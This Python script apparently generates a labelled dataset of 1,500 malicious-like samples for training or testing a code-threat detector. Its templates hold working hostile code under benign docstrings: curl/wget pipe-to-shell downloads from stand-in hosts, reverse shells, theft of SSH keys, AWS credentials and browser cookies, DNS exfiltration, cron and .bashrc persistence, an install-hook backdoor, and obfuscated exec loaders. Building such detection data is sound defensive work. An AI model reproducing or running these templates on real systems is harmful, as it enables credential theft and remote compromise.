from __future__ import annotations

import json
import random
import string
from pathlib import Path
from typing import Callable

random.seed(123)

                               

def _rand_name(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=n))

def _rand_host() -> str:
    return random.choice([
        "attacker.example.test", "exfil.controlled.test", "c2.testlab.local",
        "192.0.2.{}".format(random.randint(1, 254)),
        "203.0.113.{}".format(random.randint(1, 254)),
    ])

def _rand_port() -> int:
    return random.choice([4444, 8080, 9001, 1337, 31337, 53, 443])

                                 

def t_os_system_curl() -> str:
    host = _rand_host()
    return f'''"""Updater stub."""
import os

def update():
    os.system("curl -sSL http://{host}/install.sh | sh")

if __name__ == "__main__":
    update()
'''

def t_subprocess_shell_true() -> str:
    host = _rand_host()
    return f'''"""Run host check."""
import subprocess

cmd = "wget -qO- http://{host}/payload | bash"
subprocess.run(cmd, shell=True, check=False)
'''

def t_subprocess_popen_pipe() -> str:
    return '''"""Pipe two shell commands."""
import subprocess

p1 = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
p2 = subprocess.Popen(["nc", "-w", "3", "10.0.0.1", "4444"], stdin=p1.stdout)
p1.stdout.close()
p2.communicate()
'''

def t_socket_reverse_shell() -> str:
    host = _rand_host()
    port = _rand_port()
    return f'''"""Connect-back helper."""
import socket
import subprocess
import os

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{host}", {port}))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    connect()
'''

def t_pty_spawn_shell() -> str:
    host = _rand_host()
    port = _rand_port()
    return f'''"""Spawn a tty shell after connecting back."""
import socket, os, pty

s = socket.socket()
s.connect(("{host}", {port}))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
pty.spawn("/bin/bash")
'''

def t_eval_input() -> str:
    return '''"""Math helper."""
def calc(expr):
    return eval(expr)

if __name__ == "__main__":
    user_expr = input("expression: ")
    print(calc(user_expr))
'''

def t_exec_b64() -> str:
    payload = "import os; os.system('id')"
    import base64
    enc = base64.b64encode(payload.encode()).decode()
    return f'''"""Bootstrap stage 2."""
import base64

PAYLOAD = "{enc}"

def run():
    exec(base64.b64decode(PAYLOAD).decode())

if __name__ == "__main__":
    run()
'''

def t_compile_exec() -> str:
    return '''"""Run compiled snippet."""
src = "import socket; socket.socket().connect(('10.0.0.1', 4444))"
code = compile(src, "<dyn>", "exec")
exec(code)
'''

def t_getattr_import() -> str:
    return '''"""Resolve module dynamically."""
mod = __import__("o" + "s")
fn = getattr(mod, "sy" + "stem")
fn("curl http://10.0.0.1/x | sh")
'''

def t_urllib_post_env() -> str:
    host = _rand_host()
    return f'''"""Diagnostics ping."""
import os
import json
import urllib.request

def report():
    data = {{
        "user": os.environ.get("USER", ""),
        "home": os.environ.get("HOME", ""),
        "path": os.environ.get("PATH", ""),
        "cwd": os.getcwd(),
    }}
    body = json.dumps(data).encode()
    req = urllib.request.Request(
        "http://{host}/collect",
        data=body,
        headers={{"Content-Type": "application/json"}},
    )
    urllib.request.urlopen(req, timeout=5)

if __name__ == "__main__":
    report()
'''

def t_requests_exfil_ssh() -> str:
    host = _rand_host()
    return f'''"""Sync helper."""
import os
import requests

def upload():
    keys_dir = os.path.expanduser("~/.ssh")
    files = {{}}
    for name in os.listdir(keys_dir):
        full = os.path.join(keys_dir, name)
        if os.path.isfile(full):
            with open(full, "rb") as fh:
                files[name] = fh.read()
    requests.post("http://{host}/u", files=files, timeout=10)

if __name__ == "__main__":
    upload()
'''

def t_aws_creds_read() -> str:
    host = _rand_host()
    return f'''"""Cloud config check."""
import os
import requests

def send():
    path = os.path.expanduser("~/.aws/credentials")
    if os.path.isfile(path):
        with open(path) as fh:
            requests.post("http://{host}/c", data=fh.read(), timeout=5)

send()
'''

def t_browser_cookies() -> str:
    host = _rand_host()
    return f'''"""Sync browser data."""
import os
import sqlite3
import requests

def grab():
    path = os.path.expanduser("~/.config/google-chrome/Default/Cookies")
    if not os.path.isfile(path):
        return
    conn = sqlite3.connect(path)
    rows = conn.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall()
    conn.close()
    requests.post("http://{host}/x", json=[list(r) for r in rows[:50]], timeout=5)

grab()
'''

def t_persistence_cron() -> str:
    return '''"""Install background scheduler."""
import os

def install():
    line = "* * * * * /tmp/.svc-helper > /dev/null 2>&1\\n"
    cron = os.path.expanduser("~/cron.tmp")
    with open(cron, "w") as fh:
        fh.write(line)
    os.system(f"crontab {cron}")

install()
'''

def t_persistence_bashrc() -> str:
    host = _rand_host()
    return f'''"""Configure shell hook."""
import os

hook = "\\n# autostart\\ncurl -sSL http://{host}/s | sh &\\n"
rc = os.path.expanduser("~/.bashrc")
with open(rc, "a") as fh:
    fh.write(hook)
'''

def t_marshal_loader() -> str:
    return '''"""Resource loader."""
import marshal
import zlib
import base64

BLOB = b"eJxLzMnPS1XwSEzMURBKzs9JS00FACUpBYI="

def boot():
    code = marshal.loads(zlib.decompress(base64.b64decode(BLOB)))
    exec(code)

boot()
'''

def t_lambda_packer() -> str:
    return '''"""Bootstrap stub."""
import base64, zlib
_ = lambda __: exec(zlib.decompress(base64.b64decode(__)))
_(b"eJxLzMnPS1XwSEzMURBKzs9JS00FACUpBYI=")
'''

def t_chr_concat_exec() -> str:
    return '''"""Bootstrap helper."""
exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(59)+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(105)+chr(100)+chr(39)+chr(41))
'''

def t_setup_py_install_hook() -> str:
    host = _rand_host()
    return f'''"""Package setup."""
from setuptools import setup
from setuptools.command.install import install
import os

class CustomInstall(install):
    def run(self):
        os.system("curl -sSL http://{host}/p | sh")
        install.run(self)

setup(
    name="{_rand_name(8)}",
    version="0.1.0",
    cmdclass={{"install": CustomInstall}},
)
'''

def t_dnsexfil() -> str:
    host = _rand_host()
    return f'''"""Status beacon."""
import socket
import os

token = os.environ.get("USER", "anon")[:30]
try:
    socket.gethostbyname(f"{{token}}.{host}")
except socket.gaierror:
    pass
'''

def t_process_discovery() -> str:
    return '''"""Inventory running services."""
import subprocess

out = subprocess.check_output(["ps", "auxf"], text=True)
sock = __import__("socket").socket()
sock.connect(("10.0.0.1", 4444))
sock.sendall(out.encode())
sock.close()
'''

TEMPLATES: list[Callable[[], str]] = [
    t_os_system_curl, t_subprocess_shell_true, t_subprocess_popen_pipe,
    t_socket_reverse_shell, t_pty_spawn_shell, t_eval_input, t_exec_b64,
    t_compile_exec, t_getattr_import, t_urllib_post_env, t_requests_exfil_ssh,
    t_aws_creds_read, t_browser_cookies, t_persistence_cron, t_persistence_bashrc,
    t_marshal_loader, t_lambda_packer, t_chr_concat_exec,
    t_setup_py_install_hook, t_dnsexfil, t_process_discovery,
]

def generate(out_dir: Path, n: int = 1500) -> list[dict]:
    out_dir.mkdir(parents=True, exist_ok=True)
    records = []
    for i in range(n):
        template = random.choice(TEMPLATES)
        code = template()
        rec_id = f"malicious_{i:05d}"
        path = out_dir / f"{rec_id}.py"
        path.write_text(code)
        records.append({
            "id": rec_id,
            "path": str(path),
            "label": 1,
            "label_name": "malicious",
            "template": template.__name__,
            "obfuscation": None,
        })
    return records

if __name__ == "__main__":
    out = Path(__file__).resolve().parents[2] / "data" / "raw" / "malicious"
    n = 1500
    records = generate(out, n=n)
    manifest = out.parent.parent / "splits" / "malicious_manifest.jsonl"
    manifest.parent.mkdir(parents=True, exist_ok=True)
    with manifest.open("w") as fh:
        for r in records:
            fh.write(json.dumps(r) + "\n")
    print(f"wrote {len(records)} malicious-like scripts to {out}")
    print(f"manifest at {manifest}")
